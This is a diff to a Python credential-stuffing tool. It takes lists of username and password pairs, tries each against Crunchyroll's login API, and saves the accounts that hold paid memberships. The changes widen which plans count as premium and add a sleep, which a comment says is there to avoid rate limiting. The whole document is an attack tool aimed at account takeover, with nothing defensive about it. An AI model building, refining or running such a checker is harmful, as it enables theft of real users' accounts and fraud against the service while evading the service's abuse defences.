@@ -1,5 +1,6 @@
 # -*- coding: utf-8 -*-
 import requests
+import time
 
 def check_crunchyroll_account(username, password):
     device_id = "09313DAA-FD60-476F-BE6C-DCE586A53BB4"
@@ -37,7 +38,7 @@ def check_crunchyroll_account(username, password):
         return {"status": "failure", "message": "Failed to obtain access token."}
     
     access_token = result["access_token"]
-    headers["authorization"] = f"Bearer {access_token}"
+    headers["Authorization"] = f"Bearer {access_token}"
 
     try:
         account_info_response = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers)
@@ -58,13 +59,17 @@ def check_crunchyroll_account(username, password):
 
     subscription_info = subscription_response.json()
 
-    if "subscription_country" not in subscription_info or "subscription_plan" not in subscription_info:
+    if "subscription_country" not in subscription_info:
         return {"status": "free", "message": "Free account or no subscription found."}
     
     country_code = subscription_info["subscription_country"]
-    plan = subscription_info.get("subscription_plan", "Unknown Plan")
+    # Extract any other relevant details for premium checking
+    plan_details = subscription_info.get("subscription_plan_details", "Unknown Plan Details")
 
-    if plan.lower() in ["mega fan membership", "premium", "other premium plans"]:  # Adjust this condition as needed
+    # Define which details indicate premium plans
+    premium_indicators = ["Fan Membership", "Mega Fan Membership", "Annual Mega Fan Membership"]
+
+    if any(indicator in plan_details for indicator in premium_indicators):
         country_dict = {
             "AF": "Afghanistan 🇦🇫",
             "AT": "Austria 🇦🇹",
@@ -126,8 +131,9 @@ def process_accounts(input_path, output_path):
                                       f"Country: {result['subscription_country']}, Info: {result['subscription_info']}")
                         outfile.write(valid_info + "\n")
                         print(f"Valid account found and saved: {valid_info}")
-                    else:
-                        print(f"Account {username}: {result['status']} - {result['message']}")
+                    
+                    # Introduce a delay to avoid rate limiting
+                    time.sleep(5)  # Adjust the delay as needed (in seconds)
                 
         print(f"Processing complete. Valid accounts saved to {output_path}.")
     
@@ -140,4 +146,4 @@ if __name__ == "__main__":
     input_path = input("Enter the path to the accounts file (e.g., /storage/emulated/0/Download/crunchyroll.txt): ")
     output_path = input("Enter the path to save valid accounts (e.g., /storage/emulated/0/Download/valid_accounts.txt): ")
     process_accounts(input_path, output_path)
-        
+    
